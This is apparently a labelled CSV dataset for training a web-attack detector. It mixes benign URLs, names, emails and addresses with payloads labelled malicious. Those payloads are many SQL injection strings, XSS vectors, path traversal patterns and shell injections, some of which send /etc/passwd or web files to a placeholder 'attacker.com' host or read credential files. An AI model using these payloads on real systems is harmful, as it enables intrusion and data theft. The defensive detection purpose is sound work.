payload,label
"1"") as paai where 4089=4089 and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",1
/login?redirect_url=/dashboard/user/407343,0
/product?id=721342&utm_source=facebook&campaign=sale,0
"-6760 or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))# ikqw",1
1) as mtda where 3951=3951;select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--,1
/index.php?id=hải621,0
"-3116""))) union all select 4600,4600,4600,4600--",1
cleofs,0
/api/v1/auth?token=2yU2GzE9,0
/team/verona/09SGAZHJ/statistics,0
70153248m,0
6629,0
presbiteriano,0
/product?id=568432&utm_source=facebook&campaign=sale,0
/api/v1/users?page=hải907,0
/api/v1/auth?token=KAzokHuj,0
22,0
/product?id=879161&utm_source=facebook&campaign=sale,0
-1769 union all select 6054--,1
1%'));(select * from (select(sleep(5)))acdk)#,1
8025245569299513,0
meed@peliculasen3d.va,0
"1' and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)",1
matthews.russa@pensionesbaratas.com.bi,0
/assets/style.css?category=admin95,0
"-6307' where 8916=8916 union all select 8916,8916,8916,8916,8916,8916,8916--",1
/product?id=968818&utm_source=facebook&campaign=sale,0
"1"" where 5216=5216 or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",1
"1"" where 5333=5333 and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",1
207,0
121,0
/assets/style.css?token=hải154,0
hillerman.gallo@muebetuweb.ki,0
1') as upgb where 2031=2031;select case when 7717=7717 then 1 else null end--,1
4567,0
"1')));call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1
cribada,0
clarette,0
/assets/style.css?user=admin800,0
/team/verona/rJVMXD95/statistics,0
"1"") as jidc where 6093=6093 and 9198=9198--",1
"a=""get"";b=""url"";c=""javascript:"";d=""alert('xss');"";eval(a+b+c+d);",1
"-2397)) as oizy where 1746=1746 union all select 1746,1746,1746,1746,1746,1746#",1
/home?page=contact403,0
/index.php?q=kma887,0
28505,0
"calle san isidro labrador 188, 13?h",0
/login?redirect_url=/dashboard/user/534178,0
/product?id=47545&utm_source=facebook&campaign=sale,0
"1%"")) and sleep(5) and ((""%""=""",1
/assets/style.css?token=profile124,0
10332,0
/product?id=596841&utm_source=facebook&campaign=sale,0
/product/detail?id=hải702,0
1 and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)# cykf,1
najli,0
"1%"" and elt(5345=8751,8751) and ""%""=""",1
"1')) as dqby where 9256=9256;select like('abcdefg',upper(hex(randomblob(500000000/2))))--",1
sevilleja de la jara,0
"1'+(select 'usoq' where 7783=7783 and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161))+'",1
/api/v1/users?token=2026241,0
18517,0
"1'))) or 8466=benchmark(5000000,md5(0x694a4745)) and ((('sqzl'='sqzl",1
/search?id=book507,0
28820,0
"1' or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and 'jjmt'='jjmt",1
15953,0
1%')));select (case when (5704=4125) then 5704 else cast(1 as int)/(select 0 from dual) end) from dual--,1
auleda sez,0
acedera,0
/home?page=kma394,0
"-5360' where 8178=8178 union all select 8178,8178,8178--",1
sort,0
/api/v1/auth?token=Hno5mgkW,0
cabrillas,0
cowart,0
/team/verona/k3vXSpnI/statistics,0
/product/detail?user=kma365,0
"<a href=""rhainfosec.com"" onclimbatree=alert(1)>ClickHere</a>",1
/team/verona/qZfR1Uk4/statistics,0
9548,0
1')));select sleep(5)#,1
4542,0
venialbo,0
/assets/style.css?user=book779,0
maurijn,0
5ecom058a?8a,0
1');select case when 6662=9889 then 1 else null end--,1
4244,0
"1') as rvli where 4427=4427;call regexp_substring(repeat(right(char(2385),0),500000000),null)--",1
; cat /etc/passwd&&,1
/product?id=63059&utm_source=facebook&campaign=sale,0
"1') and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161) and ('ngxz'='ngxz",1
&& netstat -tunlp,1
/index.php?page=kma501,0
emetrio,0
hilaria,0
/assets/style.css?id=contact400,0
/api/v1/auth?token=gGZ0wnyE,0
meinrad,0
"1) and make_set(8403=8403,8899) and (9761=9761",1
"-8046""))) union all select 3126,3126,3126,3126,3126,3126,3126,3126,3126#",1
99997973e,0
/search?id=kma35,0
/api/v1/auth?token=9sjaN7Zt,0
holgorio,0
32621,0
8322438262219801,0
"1 and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))# rhli",1
"1;select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual",1
| whoami | nc attacker.com 4444,1
/index.php?id=hải823,0
82,0
-9143) or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric),1
e0l4i1,0
0582956368100582,0
/api/v1/auth?token=AUBvQj5w,0
5070501276663711,0
calle jeremias 14 7b,0
/home?id=apple890,0
pinazo paillalef,0
"1)) as nxdf where 1696=1696 or 8514=benchmark(5000000,md5(0x544d5a4c))#",1
"1"") where 6964=6964;select count(*) from generate_series(1,5000000)--",1
&& timeout 10,1
funicello-gadden@18horas.fo,0
"1%"" and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)) and ""%""=""",1
/login?redirect_url=/dashboard/user/223119,0
/home?id=shoes616,0
40592671v,0
&& timeout 15,1
1;select pg_sleep(5)--,1
/login.html?user=admin875,0
"1 where 6434=6434;select benchmark(5000000,md5(0x4c4d6142))--",1
65281809n,0
"1) as guru where 7615=7615 union all select null,null,null,null,null,null,null,null,null,null#",1
/home?q=book900,0
/team/verona/224c6hmi/statistics,0
scheppan-ishikawa@tuslimites.ly,0
/login?redirect_url=/dashboard/user/648410,0
61225121h,0
chrysa2,0
/product?id=427390&utm_source=facebook&campaign=sale,0
quintina,0
"1""));(select * from (select(sleep(5)))acdk)#",1
revacunacin,0
/team/verona/Q44pdNZD/statistics,0
/product?id=229567&utm_source=facebook&campaign=sale,0
/product?id=565076&utm_source=facebook&campaign=sale,0
"1))) or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and (((7589=7589",1
24314757p,0
teller@asesoriaviesca.edu,0
montvez zurita,0
carolle,0
c/ comercio 51,0
latimer@puntodevistafotografia.ve,0
$( ping -c 10 127.0.0.1 ),1
/api/v1/auth?token=yDYM3SV7,0
g8629e8d9r,0
/index.php?token=shoes309,0
/product?id=289436&utm_source=facebook&campaign=sale,0
carrer vidal i barraquer 28,0
/team/verona/7LvEJwNd/statistics,0
"-5832"") or 1650=9011--",1
danis,0
es2o135mie5to,0
c/ puerto de la magdalena 107,0
"1"" where 4445=4445 procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1)--",1
"<script a="">"" src=""http://vulnerability-lab.com/crosssitescripting.js""></script>",1
/home?page=hải645,0
bailn lapetini,0
/api/v1/auth?token=WVXzuRai,0
"1')) as bedq where 8781=8781 or 8466=benchmark(5000000,md5(0x694a4745))--",1
blancafort,0
/login.html?category=shoes446,0
/api/v1/auth?token=hLaghCFw,0
"1"" and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)",1
"<object type=""text/x-scriptlet"" data=""http://jsfiddle.net/XLE63/ ""></object>",1
craig@youtubeanunciox.gf,0
"-7347"")) union all select 4360,4360,4360,4360,4360,4360,4360,4360,4360#",1
91328189l,0
/product/detail?token=123681,0
/product?id=516144&utm_source=facebook&campaign=sale,0
1' in boolean mode);if(3392=4422) select 3392 else drop function xsqq--,1
baides,0
calbucura bansells,0
ogassa,0
tuneu,0
/login?redirect_url=/dashboard/user/73755,0
/team/verona/bQszpQG7/statistics,0
"<%tag style=""xss:expression(alert(123))"">",1
/assets/style.css?id=kma918,0
1));begin user_lock.sleep(5); end--,1
09030291p,0
983tau027iv1,0
mula,0
/api/v1/auth?token=hErFwy26,0
tejeda y segoyuela,0
4403,0
cabredo,0
niel5,0
"-9295))) or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (((8752=8752",1
"1%')) or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and (('%'='",1
"1%""))) or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and (((""%""=""",1
"passatge joan casas 152, 4c",0
||`pwd`,1
"1%'));select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and (('%'='",1
1'||(select 'yydv' from dual where 9639=9639;select case when 8514=3207 then 1 else null end--,1
339403r90am958e,0
"-3261""))) or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (((""yxms""=""yxms",1
saleh,0
-5217 where 3620=3620 or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)--,1
"1 where 4477=4477 union all select null,null,null,null,null,null,null,null,null,null--",1
da silva kerber,0
"c/ cristu benditu, 112, 12?g",0
1'));begin user_lock.sleep(5); end and (('zlsq'='zlsq,1
/team/verona/g7u7qc6W/statistics,0
rabanal morante,0
/index.php?user=profile147,0
muntadas,0
isolda,0
"1"")) procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1) and ((""jzbb""=""jzbb",1
"1'||(select 'ltqo' where 9080=9080 and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))))||'",1
"1%'))) and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",1
& timeout 15,1
/login.html?id=123717,0
"c/ moragues 159, 6?a",0
yern,0
"-2441' union all select 1853,1853,1853,1853,1853,1853,1853--",1
ethan,0
/search?token=apple409,0
/login.html?user=1233,0
"1"")) as puws where 7006=7006;select (case when (7997=1543) then 7997 else cast(1 as int)/(select 0 from dual) end) from dual--",1
/product?id=618685&utm_source=facebook&campaign=sale,0
CREATE TABLE shell(output text);,1
potrear,0
<audio src=x onerror=prompt(1);>,1
ehrlich.selwyne@ebaz.ba,0
/home?user=admin110,0
taneda@ajuntamentdebcn20.be,0
"1') as hlbq where 2347=2347 and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--",1
""" onblur=alert(xss) ""> <""",1
walborn@19horas.cat,0
r54o60a,0
calle medina azahara 136 5f,0
/product?id=212898&utm_source=facebook&campaign=sale,0
"c/ torre, 23",0
"calle puruuela, 15 6?d",0
/api/v1/auth?token=EI1SBGzo,0
/login?redirect_url=/dashboard/user/926413,0
claros lafragueta,0
1' where 4253=4253;waitfor delay '0:0:5'--,1
">""<BASE HREF=""javascript:document.cookie=true;//"">",1
/home?id=hải58,0
/team/verona/wz8VqpI1/statistics,0
arxe matsumiya,0
"-7531'))) union all select 6900,6900,6900,6900,6900,6900,6900,6900,6900#",1
; tar czf - /var/www | curl -X POST -d @- http://attacker.com,1
cbdar,0
kolanko lisarde,0
/..../..../..../..../..../..../{file},1
/home?id=book238,0
"1%""));select * from generate_series(2382,2382,case when (2382=4352) then 1 else 0 end) limit 1--",1
antonelli-ankrum@escarba.pm,0
roco@forohh.ge,0
/search?page=book69,0
1')) and (select * from (select(sleep(5)))gcrr)#,1
yactura,0
; wget http://attacker.com/?x=$(cat /etc/passwd | base64),1
manica,0
1%')));select (case when (3855=3855) then 3855 else 1/(select 0) end)--,1
22860,0
/login?redirect_url=/dashboard/user/853636,0
"1' in boolean mode) union all select null,null#",1
alkin@lesionesmusculares.pf,0
wolfe,0
1') where 8128=8128;select (case when (4061=1396) then 4061 else 1/(select 0) end)--,1
quel,0
"-4076')) union all select 9030,9030,9030,9030,9030,9030,9030,9030,9030,9030--",1
/api/v1/auth?token=X1Ij49V3,0
/assets/style.css?page=shoes134,0
"1' in boolean mode) or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)#",1
/assets/style.css?user=profile506,0
1' rlike (select (case when (7689=7689) then 1 else 0x28 end)) and 'hyun' like 'hyun,1
/product?id=124005&utm_source=facebook&campaign=sale,0
"1"") where 2496=2496;select * from generate_series(7667,7667,case when (7667=8232) then 1 else 0 end) limit 1--",1
"1%"") and sleep(5)#",1
2865,0
3720111017724174,0
7785,0
-4681 or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))# rltx,1
regas@zonamodelos.tk,0
/api/v1/users?category=123363,0
-8519%')) or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and (('%'=',1
"calle manuel de falla, 65 5?a",0
/login.html?token=admin227,0
3720042690454906,0
"-5379') union all select 4294,4294,4294--",1
chamsi,0
/home?token=12358,0
"1') where 3703=3703 and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",1
lucio,0
/product?id=13366&utm_source=facebook&campaign=sale,0
/team/verona/NvbLAuL9/statistics,0
27654,0
-6397%' or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and '%'=',1
"""><IMG """"""><SCRIPT>alert(document.cookie)</SCRIPT>"">",1
/login?redirect_url=/dashboard/user/743566,0
5147466814822195,0
/api/v1/auth?token=Hp7MzO8A,0
"-1668""))) or 9323=9323#",1
pesado stahler,0
1827,0
"-8038')) or elt(1032=1032,3623) and (('xfyq'='xfyq",1
62tiba74,0
/product/detail?user=profile51,0
"-4236') union all select 2076,2076,2076,2076,2076,2076,2076,2076,2076,2076#",1
/login.html?user=admin953,0
dennett,0
23611,0
den21o9a,0
tonkovic,0
12311,0
"1';create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)",1
"gredos, 114 12?g",0
melody0,0
/login.html?token=book176,0
/login.html?id=contact958,0
81177297q,0
/login.html?category=profile771,0
/index.php?q=admin12,0
suany,0
bento,0
brocatel,0
56030847h,0
"1',(select * from generate_series(2636,2636,case when (2636=7071) then 1 else 0 end) limit 1)",1
/api/v1/auth?token=BEjmTz4T,0
1') and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ('vnfi'='vnfi,1
/./.././../{file},1
/login.html?page=hải811,0
/assets/style.css?page=profile691,0
08250,0
"1"")) as hzcq where 9250=9250 and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))--",1
/product?id=11952&utm_source=facebook&campaign=sale,0
/assets/style.css?page=2026695,0
7stambrar,0
/product?id=64411&utm_source=facebook&campaign=sale,0
encrasar,0
/team/verona/DOv5xGjQ/statistics,0
boquieni,0
"1%""))) and elt(1210=1210,sleep(5)) and (((""%""=""",1
broughton0@naturalchild.lc,0
quilligan.posselt@thw-adm.gy,0
/assets/style.css?category=book176,0
1' in boolean mode);select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--,1
3051,0
/home?page=hải9,0
06a45s3s,0
/index.php?token=123730,0
1' where 5458=5458 rlike (select * from (select(sleep(5)))vwyq)#,1
raphael_eichorn@lesionesmusculares.et,0
503,0
/product?id=576681&utm_source=facebook&campaign=sale,0
11520,0
/login?redirect_url=/dashboard/user/972366,0
"1"") as hymr where 5497=5497 union all select null,null,null,null--",1
erich,0
/search?q=123464,0
/product?id=199972&utm_source=facebook&campaign=sale,0
/assets/style.css?user=apple803,0
/.....................{file},1
44520,0
1';if(7899=7899) select 7899 else drop function zbbp--,1
"1%'))) or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x) and ((('%'='",1
2044220684799297,0
dorene6,0
karola5,0
"-4721') or elt(4378=5165,5165) and ('fufn'='fufn",1
b3st2z4,0
79365532f,0
7964371897239814,0
"-1606'||(select 'qbaa' where 3967=3967 union all select 3967,3967,3967,3967,3967--",1
/product?id=230535&utm_source=facebook&campaign=sale,0
45789,0
sant pere pescador,0
harshad,0
12064316b,0
78260205z,0
/api/v1/auth?token=WJZknOUf,0
vitriago iribe,0
/product/detail?category=kma363,0
hermon,0
"1')) or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x) and (('wbsz'='wbsz",1
"1 union all select null,null,null,null,null,null#",1
"exp/*<A STYLE='no\CrossSiteScripting:noCrossSiteScripting(""*//*"");CrossSiteScripting:ex/*CrossSiteScripting*//*/*/pression(document.cookie=true)'>",1
1')) and 9198=9198--,1
"1') and elt(4249=4249,7259) and ('bkag'='bkag",1
/login.html?category=2026705,0
/api/v1/auth?token=qu3lFpKh,0
1;if(7899=7899) select 7899 else drop function zbbp--,1
/team/verona/9NOtPIlO/statistics,0
/api/v1/auth?token=kSZ2lSZN,0
"1%"") or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",1
9178266136569781,0
lar,0
"-1434')) union all select 4734,4734,4734,4734,4734,4734,4734,4734,4734,4734#",1
/product?id=434959&utm_source=facebook&campaign=sale,0
"1'+(select tafk where 9652=9652;select benchmark(5000000,md5(0x714e4153))#",1
"1%';select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",1
40191,0
/home?q=2026782,0
"1')) or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and (('bmbt'='bmbt",1
/index.php?q=contact967,0
-9534%' or 3038=3038,1
/index.php?id=shoes11,0
/product/detail?category=hải86,0
ramesh,0
revelante,0
chiarell1,0
"1"";call regexp_substring(repeat(right(char(3702),0),500000000),null) and ""rugr""=""rugr",1
"c/ garcia mosquera, 184,",0
florin,0
"1"") as nfpe where 2679=2679;select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--",1
/product?id=491654&utm_source=facebook&campaign=sale,0
"pl. santa cruz, 199",0
"1'))) or 8466=benchmark(5000000,md5(0x694a4745)) and ((('gbhd'='gbhd",1
"calle limones, 60,",0
/index.php?id=book931,0
/assets/style.css?q=admin849,0
1626,0
/team/verona/XCfawGkk/statistics,0
/login?redirect_url=/dashboard/user/383910,0
hacinadora,0
"1'+(select 'drvv' where 5622=5622 and 3580=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",1
"1;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4",1
"-5840') or elt(1032=1032,3623)",1
"1') where 2808=2808;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",1
1')) as pgif where 6346=6346;if(7899=7899) select 7899 else drop function zbbp--,1
/api/v1/auth?token=g1nY10vZ,0
5e3i2a4,0
31229,0
"1"" and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))",1
/api/v1/auth?token=2Ddzx1bm,0
amarjit,0
/api/v1/auth?token=TF7gTjGj,0
4501987508782909,0
"calle sierra del quintanar, 199 9-b",0
monte9a,0
4140359172053437,0
"1"" where 7696=7696 and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)--",1
55z8do,0
"-9996' or make_set(1237=7111,7111)",1
/assets/style.css?token=202659,0
"-7065'+(select 'bdxr' where 1756=1756 union all select 1756,1756,1756,1756,1756,1756,1756,1756,1756,1756#",1
"1'+(select 'opqr' where 2442=2442 or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",1
feix ablitas,0
/team/verona/b9jv2Zys/statistics,0
/login.html?category=book258,0
` ping -n 30 127.0.0.1 `,1
/assets/style.css?token=shoes78,0
"1%'))) or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)) and ((('%'='",1
"<table id=xss><td background=""javascript:alert('xss')"">",1
/index.php?token=contact410,0
empeine,0
"1"")) as fmul where 7827=7827;waitfor delay '0:0:5'--",1
"calle morse, 17",0
"1'+(select oqvo where 7448=7448 union all select null,null,null,null,null--",1
"entrada purra, 122, 3?e",0
/api/v1/users?id=shoes184,0
"1""))) and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and (((""blkt"" like ""blkt",1
mayo-chandler7@barnicesuv.co,0
"1"";(select * from (select(sleep(5)))srmq)",1
"1%"";begin user_lock.sleep(5); end and ""%""=""",1
1818801431707826,0
10250,0
"-1168)) as vlol where 3475=3475 or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",1
"1"" where 8089=8089;iif(5257=5257,1,1/0)",1
| sleep 20,1
avenida casanova de eiris 42 3?c,0
caadillas almendro,0
3581640568970302,0
/login?redirect_url=/dashboard/user/929292,0
lladurs,0
"1) union all select null,null,null,null,null,null,null,null,null--",1
/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/{file},1
novillas,0
"corredoira dos cornos, 175 4-c",0
"c/ carranque, 113 5?a",0
<IMG,1
gas40so,0
"c/ la magdalena 187,",0
ed,0
18772944e,0
09614,0
pangui,0
/assets/style.css?token=hải573,0
/login.html?category=shoes245,0
72500690k,0
"1%')) or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x) and (('%'='",1
1')) as hzbj where 1725=1725 or sleep(5)#,1
/product?id=256938&utm_source=facebook&campaign=sale,0
"-8013%"" or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ""%""=""",1
"bosquecillo, 137",0
"1 or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x))# eahg",1
/search?id=contact819,0
"1' or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",1
"1%') union all select null,null,null,null,null,null,null--",1
/index.php?category=123943,0
yevtushenko-pegna@corjet.al,0
f09$m3natriz,0
/index.php?token=hải657,0
delavanti@brunoseguridad.by,0
ep9scopologio,0
/product?id=607693&utm_source=facebook&campaign=sale,0
/login?redirect_url=/dashboard/user/269274,0
"1"") where 8571=8571 and elt(4249=4249,7259)--",1
petree,0
pis ramenghi,0
8703807831121479,0
/team/verona/PGTCjjMR/statistics,0
"1%' or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and '%'='",1
/api/v1/users?user=hải294,0
koichi,0
"avda. infante don jaime, 133,",0
/product/detail?q=apple829,0
koock@aridossanchez.mt,0
68370047v,0
"1%') or 8514=benchmark(5000000,md5(0x544d5a4c))#",1
&& ls &&,1
nella,0
alg59za,0
50491,0
SELECT tablename FROM pg_catalog.pg_tables WHERE schemaname = 'public';,1
"1%"")) rlike (select * from (select(sleep(5)))sgvo) and ((""%""=""",1
-2174')) as zhoz where 4185=4185 order by 1#,1
/team/verona/IaqvRnYN/statistics,0
;id|,1
"saus, camallera i llampaies",0
/assets/style.css?token=shoes637,0
1');select pg_sleep(5)--,1
/product?id=13223&utm_source=facebook&campaign=sale,0
plaza oficios 22,0
/product?id=227568&utm_source=facebook&campaign=sale,0
"1')) and 3824=benchmark(5000000,md5(0x76555642)) and (('inrm' like 'inrm",1
/home?user=apple784,0
/home?page=profile495,0
/home?user=admin128,0
/index.php?category=123692,0
1')) and 6690=3250#,1
/login?redirect_url=/dashboard/user/311865,0
| cat /etc/passwd || id,1
"-8186%' or elt(1032=1032,3623) and '%'='",1
hoste ustrell,0
"1') and elt(3528=3566,3566)",1
/api/v1/auth?token=OmOQZSOy,0
baquerizo amatll,0
/product/detail?id=123641,0
duplan,0
/index.php?page=2026475,0
////../../../../../../../../{file},1
/product/detail?category=apple824,0
mag8,0
; hostname,1
/home?token=profile814,0
/assets/style.css?id=hải82,0
/search?q=2026577,0
davril_pallin0@evelin.com.cz,0
"-2987"") as iyob where 7827=7827 or (8459=8459)*4906--",1
"<BODY BACKGROUND=""javascript:alert('XSS');"">",1
amaranta,0
/index.php?user=apple122,0
/login?redirect_url=/dashboard/user/614389,0
3st59et982,0
"1 where 6100=6100 and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",1
/product?id=950286&utm_source=facebook&campaign=sale,0
hania,0
piesa-diestel@hacia.tz,0
/search?category=hải796,0
7057231009442608,0
20847295a,0
"c/ rua mayor, 31, 1?e",0
"avenida baraain, 51, 1?h",0
"1%""));select pg_sleep(5) and ((""%""=""",1
12269719r,0
/search?token=123753,0
porfidio,0
"1%""))) or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",1
42180,0
individuo,0
nuri,0
/api/v1/auth?token=taV8x20H,0
"1"") as kndn where 9314=9314;iif(6307=2459,1,1/0)",1
"plaza del yunque, 4,",0
/login?redirect_url=/dashboard/user/262189,0
6302817063301722,0
1'||(select 'bsbv' from dual where 5276=5276 or (select * from (select(sleep(5)))ydpu))||',1
/login?redirect_url=/dashboard/user/427390,0
/index.php?q=shoes31,0
walmsley@custombikesclothes.gd,0
"1"");select like('abcdefg',upper(hex(randomblob(500000000/2)))) and (""unju""=""unju",1
59760678p,0
carapopela,0
"-2044%')) or elt(9299=3618,3618) and (('%'='",1
2e64n8m5,0
bashan@lettere.pr,0
alises,0
